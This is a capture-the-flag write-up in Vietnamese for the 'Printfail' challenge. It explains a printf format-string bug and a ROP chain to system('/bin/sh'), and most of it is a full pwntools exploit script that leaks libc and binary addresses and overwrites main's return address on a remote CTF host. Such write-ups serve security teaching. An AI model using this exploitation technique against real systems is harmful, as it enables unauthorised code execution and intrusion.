### Printfail
- Đề cho ta một file binary duy nhất
- Vậy ta decompile bằng ida

![](https://i.imgur.com/NVH3ncR.png)

- Ta vào hàm `run_round` thì thấy nó sẽ update biến `v4` thành False nếu như chuỗi ta nhập lớn hơn 1. Ngoài ra cũng có lỗi format string ở `printf`.

![](https://i.imgur.com/gaBZYaB.png)

- Do đó ta sẽ lợi dụng fmt để write biến v1 lại là 1 như bình thường để loop tiếp.
- Ta checksec thì nhận thấy bài này full protections do đó overwrite GOT không khả thi. Do đó ta có hướng overwrite return address của main thành một loạt rop gadgets để lấy shell.
- Để thực hiện ý tưởng trên thì ta phải leak libc, leak exe để tính base.
- Tổng kết lại hướng làm của mình : leak libc -> leak exe -> overwite return address main thành pop rdi ret -> overwrite ret

![](https://i.imgur.com/E6OGdTP.png)


- Trước system mình có thêm địa chỉ của ret vì khi nó call pop rdi xong lần ret về đầu tiên call system thì bị xmm1, nên mình thêm ret trước đó để align rsp stack chia hết cho 16

- Script (khá dài và mình lười tối ưu):
```python 
from pwn import * 

exe = ELF("printfail_patched")

libc=ELF("libc6_2.31-0ubuntu9.9_amd64.so")

p=remote("puffer.utctf.live",4630)
p.sendlineafter(b'No do-overs.\n',b'A%7$n%13$llx')
p.recvuntil(b'A')
leak ='0x0000'+ p.recvline()[:-1].decode('utf-8')
leak = int(leak,16) 

libc.address = leak - 147587 
print('libc base: ',hex(libc.address))

p.sendlineafter(b'chance.\n',b'A%7$n%9$llx')
p.recvuntil(b'A')
exe_leak ='0x0000'+ p.recvline()[:-1].decode('utf-8')
exe_leak = int(exe_leak,16) 

print("exe leak: ",hex(exe_leak))
exe.address = exe_leak - 4816 
print("exe base : ",hex(exe.address))

p.sendlineafter(b'chance.\n',b'A%7$n%15$llx')
p.recvuntil(b'A')
exe_off='0x0000'+ p.recvline()[:-1].decode('utf-8')
exe_off= int(exe_off,16) 
print("exe off: ",hex(exe_off))
################step1########################
first_add = exe_off-240
log.info(hex(first_add))

writee = first_add & 0xffff

payload = f'A%7$n%{writee-1}c%30$hn'.encode()
p.sendlineafter(b'chance.\n',payload)
pop_rdi_ret = exe.address + 0x0000000000001373
print("pop_rdi_ret: ",hex(pop_rdi_ret))
writee = pop_rdi_ret& 0xffff
payload = f'A%7$n%{writee-1}c%43$hn'.encode()

p.sendlineafter(b'chance.\n',payload)

first_add += 2
writee = first_add & 0xffff
payload = f'A%7$n%{writee-1}c%30$hn'.encode()
print("add 2")
p.sendlineafter(b'chance.\n',payload)

writee = pop_rdi_ret >> 16 & 0xffff
payload = f'A%7$n%{writee-1}c%43$hn'.encode()
p.sendlineafter(b'chance.\n',payload)

first_add += 2
writee = first_add & 0xffff
payload = f'A%7$n%{writee-1}c%30$hn'.encode()
p.sendlineafter(b'chance.\n',payload)


writee = pop_rdi_ret >> 32 & 0xffff
payload = f'A%7$n%{writee-1}c%43$hn'.encode()
p.sendlineafter(b'chance.\n',payload)
print("pop rdi :",hex(pop_rdi_ret))
###############step2#####################
buf_add = exe.address + 0x0000000000004040

first_add = exe_off - 232
writee = first_add & 0xffff
print("write : ",hex(writee))
payload = f'A%7$n%{writee-1}c%30$hn'.encode()
p.sendlineafter(b'chance.\n',payload)

writee = buf_add & 0xffff
payload = f'A%7$n%{writee-1}c%43$hn'.encode()
p.sendlineafter(b'chance.\n',payload)


first_add += 2
writee = first_add & 0xffff
payload = f'A%7$n%{writee-1}c%30$hn'.encode()
print("add 2")
p.sendlineafter(b'chance.\n',payload)

writee = buf_add >> 16 & 0xffff
payload = f'A%7$n%{writee-1}c%43$hn'.encode()
p.sendlineafter(b'chance.\n',payload)

first_add += 2
writee = first_add & 0xffff
payload = f'A%7$n%{writee-1}c%30$hn'.encode()
p.sendlineafter(b'chance.\n',payload)


writee = buf_add >> 32 & 0xffff
payload = f'A%7$n%{writee-1}c%43$hn'.encode()
p.sendlineafter(b'chance.\n',payload)
####################step3##################
libc_system = libc.sym['system'] 
print("libc: ",libc_system)

first_add = exe_off - 216 

writee = first_add & 0xffff
print("write : ",hex(writee))
payload = f'A%7$n%{writee-1}c%30$hn'.encode()
p.sendlineafter(b'chance.\n',payload)

writee = libc_system& 0xffff
payload = f'A%7$n%{writee-1}c%43$hn'.encode()
p.sendlineafter(b'chance.\n',payload)


first_add += 2
writee = first_add & 0xffff
payload = f'A%7$n%{writee-1}c%30$hn'.encode()
print("add 2")
p.sendlineafter(b'chance.\n',payload)

writee = libc_system >> 16 & 0xffff
payload = f'A%7$n%{writee-1}c%43$hn'.encode()
p.sendlineafter(b'chance.\n',payload)

first_add += 2
writee = first_add & 0xffff
payload = f'A%7$n%{writee-1}c%30$hn'.encode()
p.sendlineafter(b'chance.\n',payload)


writee = libc_system >> 32 & 0xffff
payload = f'A%7$n%{writee-1}c%43$hn'.encode()
p.sendlineafter(b'chance.\n',payload)
###############################################
buf_add = exe.address + 0x000000000000101a 
first_add = exe_off - 224

writee = first_add & 0xffff
print("write : ",hex(writee))
payload = f'A%7$n%{writee-1}c%30$hn'.encode()
p.sendlineafter(b'chance.\n',payload)

writee = buf_add & 0xffff
payload = f'A%7$n%{writee-1}c%43$hn'.encode()
p.sendlineafter(b'chance.\n',payload)


first_add += 2
writee = first_add & 0xffff
payload = f'A%7$n%{writee-1}c%30$hn'.encode()
print("add 2")
p.sendlineafter(b'chance.\n',payload)

writee = buf_add >> 16 & 0xffff
payload = f'A%7$n%{writee-1}c%43$hn'.encode()
p.sendlineafter(b'chance.\n',payload)

first_add += 2
writee = first_add & 0xffff
payload = f'A%7$n%{writee-1}c%30$hn'.encode()
p.sendlineafter(b'chance.\n',payload)


writee = buf_add >> 32 & 0xffff
payload = f'A%7$n%{writee-1}c%43$hn'.encode()
p.sendlineafter(b'chance.\n',payload)
############################################
p.sendlineafter(b'chance.\n',b'/bin/sh\x00')
###########################################
p.interactive()

```
